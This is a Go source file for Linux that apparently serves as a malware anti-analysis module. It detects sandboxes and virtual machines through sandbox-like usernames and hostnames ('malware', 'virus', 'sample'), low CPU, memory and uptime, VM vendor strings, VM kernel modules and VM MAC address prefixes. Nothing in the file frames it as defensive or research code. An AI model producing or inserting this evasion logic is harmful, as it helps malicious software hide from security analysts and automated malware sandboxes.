// +build linux

package main

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strconv"
	"strings"
)

// AntiSandboxLinux provides anti-sandbox capabilities for Linux
type AntiSandboxLinux struct{}

func NewAntiSandbox() *AntiSandboxLinux {
	return &AntiSandboxLinux{}
}

// CheckUsername checks for common sandbox usernames
func (a *AntiSandboxLinux) CheckUsername() bool {
	sandboxUsers := []string{
		"malware",
		"sample",
		"virus",
		"sandbox",
		"vmware",
		"vbox",
		"test",
	}

	currentUser, err := user.Current()
	if err != nil {
		return false
	}

	username := strings.ToLower(currentUser.Username)
	for _, sandbox := range sandboxUsers {
		if strings.Contains(username, sandbox) {
			return true
		}
	}

	return false
}

// CheckHostname checks for common sandbox hostnames
func (a *AntiSandboxLinux) CheckHostname() bool {
	sandboxHosts := []string{
		"sample",
		"virus",
		"sandbox",
		"malware",
		"vmware",
		"virtual",
		"vbox",
	}

	hostname, err := os.Hostname()
	if err != nil {
		return false
	}

	hostname = strings.ToLower(hostname)
	for _, sandbox := range sandboxHosts {
		if strings.Contains(hostname, sandbox) {
			return true
		}
	}

	return false
}

// CheckCores checks for low CPU cores
func (a *AntiSandboxLinux) CheckCores() bool {
	if runtime.NumCPU() < 2 {
		return true
	}
	return false
}

// CheckMemory checks for low memory
func (a *AntiSandboxLinux) CheckMemory() bool {
	file, err := os.Open("/proc/meminfo")
	if err != nil {
		return false
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.HasPrefix(line, "MemTotal:") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				memKB, _ := strconv.ParseInt(fields[1], 10, 64)
				// Less than 2GB
				if memKB < 2*1024*1024 {
					return true
				}
			}
			break
		}
	}

	return false
}

// CheckUptime checks for low system uptime
func (a *AntiSandboxLinux) CheckUptime() bool {
	file, err := os.Open("/proc/uptime")
	if err != nil {
		return false
	}
	defer file.Close()

	var uptime float64
	fmt.Fscanf(file, "%f", &uptime)

	// Less than 10 minutes
	if uptime < 600 {
		return true
	}

	return false
}

// CheckVirtualization checks for virtualization artifacts
func (a *AntiSandboxLinux) CheckVirtualization() bool {
	// Check /sys/class/dmi/id/product_name
	productNames := []string{
		"/sys/class/dmi/id/product_name",
		"/sys/class/dmi/id/board_vendor",
		"/sys/class/dmi/id/sys_vendor",
	}

	vmIndicators := []string{
		"VMware",
		"VirtualBox",
		"QEMU",
		"KVM",
		"Xen",
		"Microsoft Corporation",
		"Parallels",
	}

	for _, path := range productNames {
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}

		product := string(data)
		for _, indicator := range vmIndicators {
			if strings.Contains(product, indicator) {
				return true
			}
		}
	}

	return false
}

// CheckModules checks for virtualization kernel modules
func (a *AntiSandboxLinux) CheckModules() bool {
	file, err := os.Open("/proc/modules")
	if err != nil {
		return false
	}
	defer file.Close()

	vmModules := []string{
		"vboxguest",
		"vboxsf",
		"vmw_balloon",
		"vmw_vmci",
		"vmxnet",
		"xenfs",
	}

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		module := strings.Fields(line)[0]

		for _, vmModule := range vmModules {
			if module == vmModule {
				return true
			}
		}
	}

	return false
}

// CheckMACAddress checks for VM MAC addresses
func (a *AntiSandboxLinux) CheckMACAddress() bool {
	// Common VM MAC prefixes
	vmMACs := []string{
		"00:0C:29", // VMware
		"00:1C:14", // VMware
		"00:50:56", // VMware
		"08:00:27", // VirtualBox
		"00:16:3E", // Xen
		"00:1C:42", // Parallels
	}

	// Read network interfaces
	interfaces, err := os.ReadDir("/sys/class/net")
	if err != nil {
		return false
	}

	for _, iface := range interfaces {
		if iface.Name() == "lo" {
			continue
		}

		macPath := "/sys/class/net/" + iface.Name() + "/address"
		data, err := os.ReadFile(macPath)
		if err != nil {
			continue
		}

		mac := strings.TrimSpace(string(data))
		for _, vmMAC := range vmMACs {
			if strings.HasPrefix(strings.ToLower(mac), strings.ToLower(vmMAC)) {
				return true
			}
		}
	}

	return false
}

// RunAllChecks runs all anti-sandbox checks
func (a *AntiSandboxLinux) RunAllChecks() bool {
	if a.CheckUsername() {
		return true
	}
	if a.CheckHostname() {
		return true
	}
	if a.CheckCores() {
		return true
	}
	if a.CheckMemory() {
		return true
	}
	if a.CheckUptime() {
		return true
	}
	if a.CheckVirtualization() {
		return true
	}
	if a.CheckModules() {
		return true
	}
	if a.CheckMACAddress() {
		return true
	}
	return false
}
